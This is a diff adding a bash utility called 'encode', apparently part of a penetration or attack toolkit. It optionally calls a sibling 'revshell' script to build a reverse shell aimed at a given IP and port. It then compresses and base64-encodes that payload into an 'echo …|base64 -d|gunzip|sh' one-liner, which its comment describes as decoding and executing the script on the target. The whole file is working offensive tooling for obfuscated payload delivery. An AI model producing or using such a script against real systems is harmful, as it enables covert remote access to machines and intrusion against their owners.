@@ -1,0 +1,22 @@
+#!/usr/bin/env bash
+# Usage: encode <file> [H=<ip> P=<port>]
+# If H and P are given, regenerates <file> via the revshell script first.
+# Outputs a one-liner that decodes and executes the script on the target.
+
+FILE="${1:?usage: encode <file> [H=ip] [P=port]}"; shift
+H="" P=""
+for arg in "$@"; do
+  case "$arg" in
+    H=*) H="${arg#H=}" ;;
+    P=*) P="${arg#P=}" ;;
+  esac
+done
+
+if [[ -n "$H" && -n "$P" ]]; then
+  "$(dirname "$0")/revshell" "$FILE" H="$H" P="$P" >/dev/null \
+    || { echo "error: revshell generation failed" >&2; exit 1; }
+fi
+
+[[ -f "$FILE" ]] || { echo "error: $FILE not found" >&2; exit 1; }
+
+printf 'echo %s|base64 -d|gunzip|sh\n' "$(gzip -9c "$FILE" | base64 | tr -d '\n')"
